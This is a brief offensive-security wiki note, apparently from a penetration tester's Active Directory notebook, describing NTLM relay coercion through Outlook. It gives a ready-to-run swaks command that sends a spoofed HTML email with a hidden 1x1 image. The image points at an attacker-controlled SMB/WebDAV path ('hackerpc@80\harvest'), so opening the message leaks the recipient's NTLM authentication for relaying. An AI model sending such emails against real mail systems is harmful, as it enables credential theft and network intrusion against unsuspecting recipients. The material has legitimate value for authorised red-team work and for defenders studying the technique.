---
title: NTLM Relay from Outlook
---

Send an email that functions as [[notes/ad/ntlm-relay-source]] and coerces the recipient to authenticate [[notes/ad/ntlm-relay-from-smb|over SMB]] or [[notes/ad/ntlm-relay-from-webdav|over WebDAV]] without further user interaction.
This only works if you have an [[notes/ad/intranet-zone|intranet-zoned]] host.

~~~ bash
swaks -s mx01.corp.com -p 25 -f hacker@corp.com -t john.doe@corp.com --header 'Subject: Test' --add-header 'MIME-Version: 1.0' --add-header 'Content-Type: text/html' --body '<img src="\\hackerpc@80\harvest\test.png" height="1" width="1"/>'
~~~

References:

- [Force NTLM Privileged Authentication](http://web.archive.org/web/20230512185516/https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse#via-email)
